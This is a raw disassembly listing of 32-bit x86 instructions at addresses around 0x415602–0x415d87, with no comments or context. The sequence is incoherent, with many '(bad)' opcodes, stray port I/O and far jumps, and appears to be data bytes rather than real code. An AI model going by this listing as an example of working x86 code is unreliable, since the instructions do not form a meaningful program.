  415602:	shr    DWORD PTR [eax+0xb],cl
  415605:	repz or ah,dl
  415608:	ja     0x4155dc
  41560a:	pop    edx
  41560b:	test   eax,0x5bbb989e
  415610:	push   esi
  415611:	push   es
  415612:	mov    edx,0xaaba0c4a
  415617:	arpl   WORD PTR [esp+eax*4],sp
  41561a:	or     DWORD PTR [eax],ebp
  41561c:	lods   al,BYTE PTR ds:[esi]
  41561d:	icebp  
  41561e:	or     al,0x51
  415620:	das    
  415621:	ror    ah,0x11
  415624:	mov    al,ds:0x6aac4cf8
  415629:	fld    TBYTE PTR [edi]
  41562b:	inc    ebp
  41562c:	arpl   WORD PTR [esp+eiz*8-0x7e1e1472],sp
  415633:	mov    BYTE PTR [esi],ch
  415635:	ds cs inc ebp
  415638:	call   0x8f5f:0x646da643
  41563f:	repnz daa 
  415641:	out    dx,al
  415642:	clc    
  415643:	into   
  415644:	add    al,0x1e
  415646:	mov    ch,0xd3
  415648:	aad    0x8a
  41564a:	sub    DWORD PTR [ebp-0x51],ecx
  41564d:	out    0xbd,al
  41564f:	pop    es
  415650:	jg     0x4156bf
  415652:	dec    ebx
  415653:	add    bl,ah
  415655:	push   es
  415656:	imul   esp
  415658:	sub    eax,0xd93164b6
  41565d:	test   al,0xbc
  41565f:	pop    edi
  415660:	mov    bh,0xa4
  415662:	bound  ebx,QWORD PTR [ecx-0x18]
  415665:	pop    ebp
  415666:	jp     0x4156d2
  415668:	inc    edi
  415669:	jbe    0x41568e
  41566b:	popf   
  41566c:	pop    esp
  41566d:	or     BYTE PTR [edx-0x40],al
  415670:	aad    0x14
  415672:	ins    BYTE PTR es:[edi],dx
  415673:	test   DWORD PTR [esi],0xd61f81db
  415679:	cdq    
  41567a:	hlt    
  41567b:	mov    ebx,0x7d684c58
  415680:	push   esi
  415681:	sub    eax,0x32567b23
  415686:	push   0xffffffb5
  415688:	xor    BYTE PTR [ebx],bh
  41568a:	add    DWORD PTR [eax-0x2133e26b],esi
  415690:	mov    bh,0xee
  415692:	sbb    bh,ah
  415694:	add    dh,BYTE PTR [eax-0x27]
  415697:	sub    DWORD PTR [ebx+0x29046609],eax
  41569d:	in     al,0x65
  41569f:	mov    DWORD PTR ds:0xc0f91dfb,esi
  4156a5:	fs add eax,0xf3060b77
  4156ab:	push   ebp
  4156ac:	add    esi,ecx
  4156ae:	pop    esi
  4156af:	mov    bh,0x78
  4156b1:	pop    es
  4156b2:	sbb    edi,ebx
  4156b4:	leave  
  4156b5:	scas   al,BYTE PTR es:[edi]
  4156b6:	(bad)  
  4156b7:	sbb    DWORD PTR [edx+0xcd6652],edi
  4156bd:	arpl   bx,bx
  4156bf:	and    dl,bh
  4156c1:	ins    BYTE PTR es:[edi],dx
  4156c2:	mov    ah,0x3c
  4156c4:	test   eax,0xd2817bce
  4156c9:	sar    edx,1
  4156cb:	dec    ebx
  4156cc:	out    dx,eax
  4156cd:	das    
  4156ce:	jno    0x415676
  4156d0:	push   ebp
  4156d1:	mov    al,0x84
  4156d3:	idiv   DWORD PTR [esi+0x10]
  4156d6:	push   ecx
  4156d7:	cli    
  4156d8:	shl    DWORD PTR [ebp-0x3726e88c],0xc9
  4156df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156e0:	adc    eax,DWORD PTR [eax]
  4156e2:	loop   0x415666
  4156e4:	int3   
  4156e5:	dec    BYTE PTR ds:0x91d81b3d
  4156eb:	mov    al,0xec
  4156ed:	dec    ebx
  4156ee:	sbb    al,0x85
  4156f0:	pop    edi
  4156f1:	in     al,0x29
  4156f3:	and    BYTE PTR [esi],al
  4156f5:	iret   
  4156f6:	jmp    0xe4ab3cac
  4156fb:	mov    cl,0xf0
  4156fd:	scas   al,BYTE PTR es:[edi]
  4156fe:	adc    eax,0xc22bb9e3
  415703:	xchg   DWORD PTR [bx],esp
  415706:	das    
  415707:	push   edx
  415708:	and    eax,0x34b19097
  41570d:	dec    eax
  41570e:	pop    ds
  41570f:	xor    esi,DWORD PTR [eax]
  415711:	out    dx,al
  415712:	mov    cl,0x6f
  415714:	cmp    al,BYTE PTR [ebp+0x37]
  415717:	mov    ebx,0xc0341eed
  41571c:	jmp    0xfcff:0x4c57085c
  415723:	pop    ss
  415724:	add    al,BYTE PTR [esi-0x69]
  415727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415728:	mov    DWORD PTR [ebp+0x62],edx
  41572b:	into   
  41572c:	mov    ds,WORD PTR [ebx-0x41]
  41572f:	hlt    
  415730:	sub    ebp,ebp
  415732:	pop    edi
  415733:	loop   0x415764
  415735:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415736:	stos   DWORD PTR es:[edi],eax
  415737:	dec    esi
  415738:	jg     0x4156cc
  41573a:	dec    eax
  41573b:	loopne 0x41570d
  41573d:	outs   dx,BYTE PTR ds:[esi]
  41573e:	ss dec edi
  415740:	out    dx,al
  415741:	ss sti 
  415743:	sub    BYTE PTR [ebx-0x4af90233],bl
  415749:	xor    BYTE PTR [ecx+0x57],cl
  41574c:	dec    edi
  41574d:	and    eax,0x5293eb4
  415752:	into   
  415753:	mov    ecx,DWORD PTR cs:[eax-0x6be54052]
  41575a:	or     eax,0x940cf4f0
  41575f:	setle  BYTE PTR [edi]
  415762:	sub    esi,esi
  415764:	mov    ch,0x1e
  415766:	js     0x415740
  415768:	mov    ?,esp
  41576a:	stos   BYTE PTR es:[edi],al
  41576b:	mov    bh,0x33
  41576d:	ret    
  41576e:	popw   ds
  415770:	adc    edx,DWORD PTR [di+0x3a]
  415774:	js     0x4156fa
  415776:	or     ebp,eax
  415778:	jbe    0x4157a9
  41577a:	test   eax,0xe5616cf2
  41577f:	mov    ?,ebp
  415781:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415782:	adc    DWORD PTR ds:0x3f67a178,0x42
  415789:	aas    
  41578a:	jle    0x415730
  41578c:	bound  edx,QWORD PTR [ecx]
  41578e:	daa    
  41578f:	cli    
  415790:	retf   0x787a
  415793:	push   ebx
  415794:	inc    esp
  415795:	fidivr DWORD PTR [edi+0x7d]
  415798:	repnz cld 
  41579a:	test   eax,0x867cf3e0
  41579f:	jne    0x415731
  4157a1:	adc    ah,BYTE PTR [ecx]
  4157a3:	loope  0x4157c9
  4157a5:	jl     0x4157fc
  4157a7:	xor    ebp,DWORD PTR [ecx+0x42231eb9]
  4157ad:	test   eax,0x5bfad265
  4157b2:	sub    eax,0x41ec7ef0
  4157b7:	out    dx,eax
  4157b8:	adc    ah,cl
  4157ba:	cmp    al,0xbd
  4157bc:	cmp    ah,BYTE PTR [ebx]
  4157be:	stos   BYTE PTR es:[edi],al
  4157bf:	mov    ds:0xa05ddc64,eax
  4157c4:	dec    esp
  4157c5:	mov    ch,0x8c
  4157c7:	lods   eax,DWORD PTR ds:[esi]
  4157c8:	pop    edi
  4157c9:	repnz mov bh,0xbe
  4157cc:	lea    ebx,[ebx-0x42]
  4157cf:	jg     0x41580e
  4157d1:	std    
  4157d2:	cli    
  4157d3:	loope  0x415825
  4157d5:	xor    al,0x69
  4157d7:	dec    esp
  4157d8:	and    BYTE PTR [eax+ebp*2],dh
  4157db:	fdivr  QWORD PTR [ebx+0x55]
  4157de:	out    0xeb,al
  4157e0:	mov    eax,0x56175a7a
  4157e5:	xlat   BYTE PTR ds:[ebx]
  4157e7:	into   
  4157e8:	jb     0x4157c3
  4157ea:	(bad)  
  4157eb:	jecxz  0x415803
  4157ed:	dec    ecx
  4157ee:	add    esp,esi
  4157f0:	clc    
  4157f1:	rol    BYTE PTR [edx],0x14
  4157f4:	retf   0x4687
  4157f7:	shl    bh,1
  4157f9:	jmp    0x4157f6
  4157fb:	lods   al,BYTE PTR ds:[esi]
  4157fc:	iret   
  4157fd:	aas    
  4157fe:	adc    BYTE PTR [ebp-0xce04d7e],al
  415804:	data16 (bad) 
  415806:	mov    ds:0x26c728b1,eax
  41580b:	mov    eax,ds:0x8617f447
  415810:	cmp    DWORD PTR [ebx-0x84c4c4f],ecx
  415816:	fsub   DWORD PTR [edx+0xd]
  415819:	ret    
  41581a:	(bad)
  41581e:	outs   dx,BYTE PTR ds:[esi]
  41581f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415820:	clc    
  415821:	je     0x415877
  415823:	loop   0x415896
  415825:	(bad)  
  415826:	xor    eax,0x377d7822
  41582b:	ret    0xe22f
  41582e:	pushw  0xff85
  415831:	sbb    eax,0x902fb98d
  415836:	(bad)  
  415837:	fbld   TBYTE PTR [ebx]
  415839:	xchg   esp,eax
  41583a:	lock inc ecx
  41583c:	retf   
  41583d:	dec    ebx
  41583e:	dec    esp
  41583f:	push   es
  415840:	jle    0x4157e9
  415842:	and    dh,BYTE PTR [edx-0xe]
  415845:	nop
  415846:	push   esp
  415847:	cmp    ah,al
  415849:	pop    edx
  41584a:	xchg   edi,eax
  41584b:	fidiv  WORD PTR [ebp-0x5714fd4c]
  415851:	mov    ecx,ebx
  415853:	lock mov ds:0x6753906,al
  415859:	hlt    
  41585a:	push   ebx
  41585b:	pop    ecx
  41585c:	jno    0x4158ba
  41585e:	and    eax,0xb2f20b20
  415863:	sbb    BYTE PTR [esi+esi*2+0x1e],bh
  415867:	pop    esi
  415868:	in     al,dx
  415869:	xchg   ecx,eax
  41586a:	mov    WORD PTR [eax-0x4f],ss
  41586d:	mov    esi,0xaa2370f1
  415872:	lea    ecx,ds:0x7483db8f
  415878:	outs   dx,DWORD PTR ds:[esi]
  415879:	xchg   BYTE PTR [esi+0x52],dh
  41587c:	lock mov esi,0x11d1641e
  415882:	call   0xc969:0x6c540d6
  415889:	mov    cl,0x9b
  41588b:	scas   eax,DWORD PTR es:[edi]
  41588c:	xchg   edx,eax
  41588d:	pusha  
  41588e:	cmc    
  41588f:	test   ebp,eax
  415891:	idiv   DWORD PTR [edx+0x6a]
  415894:	loopne 0x41587f
  415896:	mov    esp,0xa91eebc9
  41589b:	sti    
  41589c:	sbb    BYTE PTR [eax+0x18],dl
  41589f:	pop    eax
  4158a0:	xor    eax,0x74b7f876
  4158a5:	mov    ecx,0x75343fe8
  4158ab:	cmp    DWORD PTR [esi],0x54274789
  4158b1:	sub    al,0x7e
  4158b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158b4:	mov    ebx,0xdd6b00f7
  4158b9:	jmp    0x3c84:0xee0d46c
  4158c0:	icebp  
  4158c1:	pop    esi
  4158c2:	jecxz  0x4158e8
  4158c4:	inc    ecx
  4158c5:	mov    al,ds:0xcbcb95ca
  4158ca:	inc    edi
  4158cb:	push   ebx
  4158cc:	leave  
  4158cd:	add    al,0xc6
  4158cf:	adc    eax,edx
  4158d1:	dec    eax
  4158d2:	push   0x70
  4158d4:	push   ebx
  4158d6:	or     al,0xa0
  4158d8:	inc    BYTE PTR [edi-0x7fa92c50]
  4158de:	lods   eax,DWORD PTR ds:[esi]
  4158df:	popa   
  4158e0:	pusha  
  4158e1:	jae    0x41590d
  4158e3:	mov    bl,0xe6
  4158e5:	out    0xa9,eax
  4158e7:	sahf   
  4158e8:	adc    bh,0x47
  4158eb:	rol    DWORD PTR [ebp+0x27],cl
  4158ee:	cmp    ah,al
  4158f0:	xchg   DWORD PTR [edx],edi
  4158f2:	inc    esi
  4158f3:	mov    ds:0x939cd3a6,eax
  4158f8:	push   eax
  4158f9:	in     al,0x20
  4158fb:	mov    ds:0x4069cafd,eax
  415900:	pop    DWORD PTR [edi]
  415902:	mov    BYTE PTR [ebx-0x1f],dh
  415905:	pop    ds
  415906:	push   ebx
  415907:	gs cld 
  415909:	jns    0x4158ae
  41590b:	jmp    0xb7b7fd9d
  415910:	push   cs
  415911:	inc    edi
  415912:	loope  0x4158f5
  415914:	sbb    al,0x8d
  415916:	inc    eax
  415917:	lods   eax,DWORD PTR ds:[esi]
  415918:	ret    0xe709
  41591b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41591c:	or     cl,BYTE PTR [ebx+0x9d8d43f]
  415922:	sub    bh,ch
  415924:	mov    ch,0x8f
  415926:	cdq    
  415927:	retf   0x780c
  41592a:	push   ds
  41592b:	aam    0xf9
  41592d:	pop    ds
  41592e:	dec    edi
  41592f:	arpl   di,cx
  415931:	pop    ecx
  415932:	pop    ax
  415934:	dec    esp
  415935:	addr16 cmp ebx,ebx
  415938:	int3   
  415939:	cmp    DWORD PTR [ebp-0x36],ecx
  41593c:	ficom  DWORD PTR [esi-0x7d3b3fd3]
  415942:	cdq    
  415943:	xchg   edx,eax
  415944:	imul   esp,DWORD PTR [esi-0x1c],0x72
  415948:	and    BYTE PTR [ebp+0x17],dl
  41594b:	sub    bh,BYTE PTR [edx]
  41594d:	dec    esp
  41594e:	in     al,0xde
  415950:	cld    
  415951:	adc    esp,DWORD PTR [eax+0x46d32d33]
  415957:	das    
  415958:	mov    eax,ds:0xe4d4bb9a
  41595d:	scas   al,BYTE PTR es:[edi]
  41595e:	mov    eax,0x96a649c1
  415963:	out    0x6a,al
  415965:	jl     0x4159d0
  415967:	out    dx,al
  415968:	sbb    ch,bl
  41596a:	mov    eax,0x48160df6
  41596f:	sbb    ebp,eax
  415971:	mov    bh,0x12
  415973:	jbe    0x4159b4
  415975:	test   eax,0xcb37b69f
  41597a:	dec    eax
  41597b:	sti    
  41597c:	and    ebx,0xffffffb1
  41597f:	imul   esp,DWORD PTR [eax-0x495fd8fc],0x39
  415986:	or     BYTE PTR [eax],ch
  415988:	out    dx,eax
  415989:	add    dh,BYTE PTR [ebp-0x78f3c2eb]
  41598f:	and    eax,0x83dc3e5d
  415994:	push   edx
  415995:	daa    
  415996:	xchg   esp,eax
  415997:	or     dh,BYTE PTR [ecx-0x7d]
  41599a:	ficomp DWORD PTR [ebx-0x4ba0d44d]
  4159a0:	push   ss
  4159a1:	scas   eax,DWORD PTR es:[edi]
  4159a2:	dec    ebx
  4159a3:	sbb    eax,0x6abd8513
  4159a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159a9:	xor    dl,ah
  4159ab:	pushw  0x48
  4159ae:	mov    dh,0xa2
  4159b0:	(bad)  
  4159b1:	ror    BYTE PTR [ebx+0x61],1
  4159b4:	cmc    
  4159b5:	aad    0x85
  4159b7:	adc    ebx,DWORD PTR [ecx-0x4644c4d]
  4159bd:	add    al,0x6e
  4159bf:	mov    ?,WORD PTR [ecx]
  4159c1:	push   ebp
  4159c2:	popa   
  4159c3:	mov    dh,0xad
  4159c5:	pusha  
  4159c6:	inc    edi
  4159c7:	js     0x4159ee
  4159c9:	popf   
  4159ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159cb:	push   eax
  4159cc:	mov    eax,DWORD PTR [eax+0x528c356f]
  4159d2:	int    0xa2
  4159d4:	stc    
  4159d5:	(bad)  
  4159d6:	sub    ebx,DWORD PTR [edi-0x49bb4df7]
  4159dc:	jmp    0x6ac:0xfb6852f4
  4159e3:	out    dx,eax
  4159e4:	adc    ebp,DWORD PTR [ebp-0x40]
  4159e7:	(bad)  
  4159e8:	sbb    al,BYTE PTR [esi+0x7a]
  4159eb:	cld    
  4159ec:	stos   DWORD PTR es:[edi],eax
  4159ed:	aad    0x93
  4159ef:	repnz dec ebx
  4159f1:	lods   eax,DWORD PTR ds:[esi]
  4159f2:	repz das 
  4159f4:	outs   dx,DWORD PTR ds:[esi]
  4159f5:	clc    
  4159f6:	pop    edx
  4159f7:	scas   al,BYTE PTR es:[edi]
  4159f8:	pop    ss
  4159f9:	jg     0x415a48
  4159fb:	mov    al,0xbd
  4159fd:	pusha  
  4159fe:	push   edi
  4159ff:	mov    ds:0x93984f75,al
  415a04:	lahf   
  415a05:	test   al,0x8c
  415a07:	mov    ebx,0x4b9d71fe
  415a0c:	sub    BYTE PTR [esi],al
  415a0e:	lods   eax,DWORD PTR ds:[esi]
  415a0f:	icebp  
  415a10:	call   0x785dbd90
  415a15:	mov    DWORD PTR [edx-0xe9e52c3],ebp
  415a1b:	and    eax,0xaf33cc99
  415a20:	loope  0x4159c9
  415a22:	and    edx,ebp
  415a24:	dec    esp
  415a25:	outs   dx,BYTE PTR ds:[esi]
  415a26:	(bad)  
  415a27:	lds    esp,FWORD PTR [ebx*8-0x7355913]
  415a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a2f:	dec    edi
  415a30:	mov    bh,0x44
  415a32:	sub    ch,BYTE PTR [edx+edx*8]
  415a35:	aad    0x8e
  415a37:	mov    edx,?
  415a39:	mov    esi,0xf80102f
  415a3e:	in     eax,0x59
  415a40:	std    
  415a41:	retf   
  415a42:	(bad)  
  415a43:	pop    eax
  415a44:	(bad)  
  415a45:	cmp    BYTE PTR [esi-0x4b],bl
  415a48:	inc    edx
  415a49:	xchg   ebx,eax
  415a4a:	pop    es
  415a4b:	lahf   
  415a4c:	enter  0x2a1b,0x8c
  415a50:	push   cs
  415a51:	ret    
  415a52:	push   ss
  415a53:	mov    eax,ebx
  415a55:	or     bh,cl
  415a57:	mov    ebp,0xd3d1af66
  415a5c:	jo     0x415a10
  415a5e:	jmp    0x415aaf
  415a60:	(bad)  
  415a61:	les    ebx,FWORD PTR [eax+0x50]
  415a64:	mov    dh,0x71
  415a66:	(bad)  
  415a67:	xchg   BYTE PTR [ecx],ch
  415a69:	inc    esp
  415a6a:	add    ecx,DWORD PTR [eax-0x68]
  415a6d:	fsubr  QWORD PTR [edx+0x4e4611d9]
  415a73:	retf   
  415a74:	cmp    eax,0x875b9d0e
  415a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a7a:	sub    esi,DWORD PTR [edx-0x34]
  415a7d:	clc    
  415a7e:	sbb    DWORD PTR [ebx],edi
  415a80:	sub    ecx,DWORD PTR [ebp+0x66]
  415a83:	fcom   DWORD PTR [esi-0x3b]
  415a86:	dec    edi
  415a87:	xchg   esi,eax
  415a88:	sti    
  415a89:	emms   
  415a8b:	dec    ebx
  415a8c:	add    ebp,esi
  415a8e:	mov    al,0xdd
  415a90:	sti    
  415a91:	stos   DWORD PTR es:[edi],eax
  415a92:	loop   0x415a87
  415a94:	sub    BYTE PTR [ebx],bl
  415a96:	ins    BYTE PTR es:[edi],dx
  415a97:	sub    ecx,ebp
  415a99:	inc    BYTE PTR [eax]
  415a9b:	(bad)  {k1}
  415aa0:	stc    
  415aa1:	cli    
  415aa2:	mov    al,ds:0x114ca4d
  415aa7:	retf   
  415aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415aa9:	jne    0x415a83
  415aab:	loopne 0x415a87
  415aad:	or     eax,0xae5bbf59
  415ab2:	dec    ecx
  415ab3:	pop    edi
  415ab4:	inc    ebx
  415ab5:	dec    esp
  415ab6:	push   eax
  415ab7:	sub    BYTE PTR [esi],0x87
  415aba:	iret   
  415abb:	aad    0x75
  415abd:	repz jmp 0x415aac
  415ac0:	or     edx,esi
  415ac2:	pop    es
  415ac3:	test   al,0xb4
  415ac5:	cwde   
  415ac6:	test   esp,ebx
  415ac8:	push   0x5d
  415aca:	fimul  DWORD PTR [edi-0x43b064d8]
  415ad0:	or     eax,0x5572fd89
  415ad5:	sbb    al,0x15
  415ad7:	or     bh,0x33
  415ada:	push   esp
  415adb:	jmp    0x31a7b2e3
  415ae0:	shl    DWORD PTR [ecx+0x72],0xc7
  415ae4:	push   0x7f5fa552
  415ae9:	and    cl,BYTE PTR [ebx]
  415aeb:	inc    ebx
  415aec:	mov    bl,0x98
  415aee:	add    DWORD PTR [ecx],ebp
  415af0:	repnz ds daa 
  415af3:	outs   dx,BYTE PTR ds:[esi]
  415af4:	js     0x415afa
  415af6:	bound  esp,QWORD PTR [ebx]
  415af8:	aas    
  415af9:	shr    DWORD PTR [ebp+0x7c7e2477],cl
  415aff:	xor    esp,DWORD PTR [edx+0x65]
  415b02:	xor    BYTE PTR [ebx+edi*8],bl
  415b05:	push   esi
  415b06:	sub    bl,BYTE PTR [eax]
  415b08:	pop    ecx
  415b09:	in     eax,0xa5
  415b0b:	add    edx,0xffffff85
  415b0e:	pop    es
  415b0f:	push   eax
  415b10:	xchg   DWORD PTR [edx-0x5d893d89],eax
  415b16:	test   ah,ch
  415b18:	sbb    DWORD PTR [edi],0xd3c0de1d
  415b1e:	ins    BYTE PTR es:[edi],dx
  415b1f:	sbb    DWORD PTR [ebx+0x40],0x16
  415b23:	loope  0x415ab7
  415b25:	rcl    DWORD PTR [ebx-0x532ad22],1
  415b2b:	sbb    dh,dl
  415b2d:	das    
  415b2e:	push   edi
  415b2f:	test   DWORD PTR [ecx-0x43],0x3954e4f0
  415b36:	hlt    
  415b37:	aam    0x4f
  415b39:	(bad)  
  415b3b:	pop    eax
  415b3c:	push   eax
  415b3d:	dec    BYTE PTR [ebx]
  415b3f:	cli    
  415b40:	movq   QWORD PTR [ecx-0x4d684a40],mm0
  415b47:	inc    edi
  415b48:	jnp    0x415bb2
  415b4a:	xchg   esp,eax
  415b4b:	sti    
  415b4c:	ror    BYTE PTR ds:0x9cfd1a75,cl
  415b52:	dec    ebp
  415b53:	sub    DWORD PTR [ecx+edx*4-0x5389330a],eax
  415b5a:	push   ebp
  415b5b:	sti    
  415b5c:	pushf  
  415b5d:	mov    es,WORD PTR cs:[ecx+0x5f712957]
  415b64:	pop    eax
  415b65:	mov    al,ds:0xef8e3bef
  415b6a:	push   ebx
  415b6b:	sbb    eax,0xe17b9e78
  415b70:	mov    bh,0x45
  415b72:	(bad)  
  415b74:	cmc    
  415b75:	fist   WORD PTR [ecx-0x1a2d5c18]
  415b7b:	and    al,0xaa
  415b7d:	mov    bl,BYTE PTR [edi+0x26]
  415b80:	(bad)  
  415b81:	ficomp DWORD PTR [ecx-0x78a098a3]
  415b87:	cmp    DWORD PTR [esi-0x67],esp
  415b8a:	loope  0x415b31
  415b8c:	pusha  
  415b8d:	cmp    al,0xc1
  415b8f:	stos   DWORD PTR es:[edi],eax
  415b90:	mov    ds:0x39f9c739,eax
  415b95:	les    ebx,FWORD PTR fs:[eax]
  415b98:	mov    cs,WORD PTR [eax+edi*4]
  415b9b:	dec    esp
  415b9c:	pop    es
  415b9d:	pop    esp
  415b9e:	or     ah,BYTE PTR [ebx-0x25]
  415ba1:	push   edi
  415ba2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ba3:	pop    ds
  415ba4:	lds    esi,FWORD PTR [eax+0x464ecdb0]
  415baa:	inc    edi
  415bab:	cmp    eax,0x194ad2ea
  415bb0:	iret   
  415bb1:	cmp    eax,0x99263d69
  415bb6:	clc    
  415bb7:	shl    DWORD PTR [ecx],1
  415bb9:	xchg   edx,eax
  415bba:	mov    ch,0xa1
  415bbc:	xor    BYTE PTR [edi-0x4e],dh
  415bbf:	pusha  
  415bc0:	xor    dl,0x22
  415bc3:	push   edi
  415bc4:	jle    0x415bfd
  415bc6:	mov    esi,0x827357ff
  415bcb:	and    BYTE PTR [ebx+0x20],ch
  415bce:	imul   edx,DWORD PTR [ebx+0x463cec2a],0xffffffd2
  415bd5:	imul   BYTE PTR [ebx]
  415bd7:	add    cl,BYTE PTR [ecx+eiz*4]
  415bda:	retf   
  415bdb:	dec    edx
  415bdc:	push   edi
  415bdd:	dec    ebp
  415bde:	push   gs
  415be0:	sbb    ebp,DWORD PTR [ebx]
  415be2:	mov    esp,DWORD PTR [esi+0x67c36fa5]
  415be8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415be9:	popa   
  415bea:	jne    0x57a5c19e
  415bf0:	das    
  415bf1:	add    eax,0x8cf33b80
  415bf6:	push   es
  415bf7:	dec    eax
  415bf8:	scas   al,BYTE PTR es:[edi]
  415bf9:	xor    eax,0x6aa4a03a
  415bfe:	sahf   
  415bff:	mov    ah,0x8a
  415c01:	jns    0x415c5b
  415c03:	aas    
  415c04:	sbb    esp,DWORD PTR [ebp+0x1dcaaf1d]
  415c0a:	ja     0x415c01
  415c0c:	or     BYTE PTR [eax+0x410bb6c1],al
  415c12:	into   
  415c13:	cwde   
  415c14:	outs   dx,DWORD PTR ds:[esi]
  415c15:	mov    dl,0x2d
  415c17:	xchg   esi,eax
  415c19:	xchg   esi,eax
  415c1a:	dec    esp
  415c1b:	das    
  415c1c:	jl     0x415c60
  415c1e:	add    bl,BYTE PTR [ecx+0x58c3b17a]
  415c24:	scas   eax,DWORD PTR es:[edi]
  415c25:	sub    ah,dl
  415c27:	dec    ecx
  415c28:	int    0x3b
  415c2a:	push   0xfffffff3
  415c2c:	call   0x5bb5:0x5e52573
  415c33:	call   0x227ef385
  415c38:	or     ah,0x8b
  415c3b:	pop    es
  415c3c:	sbb    cl,BYTE PTR [edi]
  415c3e:	neg    DWORD PTR [eax+0x47d24bf4]
  415c44:	retf   0x28f9
  415c47:	enter  0x9f79,0x70
  415c4b:	inc    DWORD PTR [eax]
  415c4d:	mov    ch,0x40
  415c4f:	sub    BYTE PTR [ebx],bl
  415c51:	dec    edi
  415c52:	add    eax,0x855b9458
  415c57:	and    al,0x74
  415c59:	xlat   BYTE PTR ds:[ebx]
  415c5a:	mov    ds:0xfc55c86b,eax
  415c5f:	add    al,0xd5
  415c61:	jo     0x415be7
  415c63:	add    ch,al
  415c65:	mov    dl,0xce
  415c67:	leave  
  415c68:	add    DWORD PTR [esi],edx
  415c6a:	neg    BYTE PTR [ebx+ebx*2-0x38]
  415c6e:	or     esp,esp
  415c70:	stc    
  415c71:	mov    ch,0x39
  415c73:	std    
  415c74:	rol    BYTE PTR [esi-0x29],cl
  415c77:	inc    ebp
  415c78:	cli    
  415c79:	in     al,dx
  415c7a:	inc    ebp
  415c7b:	push   cs
  415c7c:	cmc    
  415c7d:	adc    cl,BYTE PTR [edx]
  415c7f:	fwait
  415c80:	test   DWORD PTR [edx],0x190c1749
  415c86:	outs   dx,BYTE PTR ds:[esi]
  415c87:	jns    0x415c5b
  415c89:	fcom   QWORD PTR [ebx]
  415c8b:	sbb    esi,ecx
  415c8d:	sbb    DWORD PTR [ecx+0x40884bc6],esi
  415c93:	jmp    0x9c1e:0xaffcd3b5
  415c9a:	(bad)  
  415c9b:	retf   0x6fa3
  415c9e:	cmp    al,0xba
  415ca0:	xlat   BYTE PTR fs:[ebx]
  415ca2:	mov    edi,gs
  415ca4:	out    0xb9,al
  415ca6:	jne    0x415c85
  415ca8:	out    0xdf,al
  415caa:	push   edi
  415cab:	(bad)  
  415cac:	xchg   esp,eax
  415cad:	fs in  eax,dx
  415caf:	pop    edi
  415cb0:	sub    al,0x4b
  415cb2:	pop    esi
  415cb3:	ss scas al,BYTE PTR es:[edi]
  415cb5:	push   esi
  415cb6:	mov    WORD PTR [eax+0x5b],ds
  415cb9:	pop    edx
  415cba:	dec    edx
  415cbb:	shr    DWORD PTR [ecx],0xb
  415cbe:	jmp    0xcb171223
  415cc3:	pushf  
  415cc4:	sub    DWORD PTR [eax],ebp
  415cc6:	adc    eax,0x822c1bf8
  415ccb:	inc    ebx
  415ccc:	mov    ds:0xa9211621,al
  415cd1:	jecxz  0x415d2f
  415cd3:	stos   DWORD PTR es:[edi],eax
  415cd4:	mov    ch,0xde
  415cd6:	pop    ds
  415cd7:	mov    DWORD PTR [esi+0x4e50ff7d],edx
  415cdd:	cmp    BYTE PTR [ebx],dl
  415cdf:	push   edx
  415ce1:	test   al,0x1c
  415ce3:	out    dx,eax
  415ce4:	outs   dx,BYTE PTR ds:[esi]
  415ce5:	lods   eax,DWORD PTR ds:[esi]
  415ce6:	mov    edi,0xf51085b8
  415ceb:	mov    ecx,0x9d4e5dca
  415cf0:	push   eax
  415cf1:	adc    BYTE PTR [ecx+0x4e2c70e5],cl
  415cf7:	leave  
  415cf8:	xlat   BYTE PTR ds:[ebx]
  415cf9:	adc    BYTE PTR [eax+0x3121b01],ah
  415cff:	push   edx
  415d00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d01:	add    al,0x51
  415d03:	mov    esp,0x671b2445
  415d08:	adc    esp,DWORD PTR [ecx]
  415d0a:	cmp    eax,0x53c33a17
  415d0f:	sub    eax,0xe74714f2
  415d14:	jge    0x415d58
  415d16:	and    ebp,DWORD PTR [eax]
  415d18:	add    eax,0xebfd6765
  415d1d:	dec    esi
  415d1e:	out    0x12,al
  415d20:	js     0x415d26
  415d22:	jbe    0x415cdb
  415d24:	cmp    ebx,eax
  415d26:	mov    ds:0x627d1db9,eax
  415d2b:	popf   
  415d2c:	inc    edx
  415d2d:	adc    bl,bl
  415d2f:	xor    edi,ecx
  415d31:	adc    BYTE PTR [edi+ebx*4+0xb],bh
  415d35:	xor    DWORD PTR [edx-0x654c0466],eax
  415d3b:	jecxz  0x415d36
  415d3d:	inc    ebp
  415d3e:	inc    edx
  415d3f:	out    dx,al
  415d40:	test   dl,al
  415d42:	xor    al,0xdd
  415d44:	pushf  
  415d45:	out    0x3a,al
  415d47:	cmp    BYTE PTR [ebp+0x61a21643],0x8f
  415d4e:	nop
  415d4f:	xor    al,0x48
  415d51:	mov    ah,0x4a
  415d53:	xchg   ecx,eax
  415d54:	pushf  
  415d55:	pusha  
  415d56:	std    
  415d57:	sbb    DWORD PTR [ebx-0xc],ebx
  415d5a:	push   eax
  415d5b:	xchg   BYTE PTR ds:0x43e64c1c,ah
  415d61:	adc    DWORD PTR [ecx-0x7688ab65],edi
  415d67:	test   al,0xf8
  415d69:	clc    
  415d6a:	mov    esp,0x7731c058
  415d6f:	push   esp
  415d70:	mov    ebp,ss
  415d72:	in     al,dx
  415d73:	cmp    dh,BYTE PTR [ecx-0x17b3d3d7]
  415d79:	push   ebx
  415d7a:	out    dx,eax
  415d7b:	or     eax,0x73053df0
  415d80:	adc    BYTE PTR [ebx+0x7d7b7ae2],dl
  415d86:	(bad)  
  415d87:	leave  
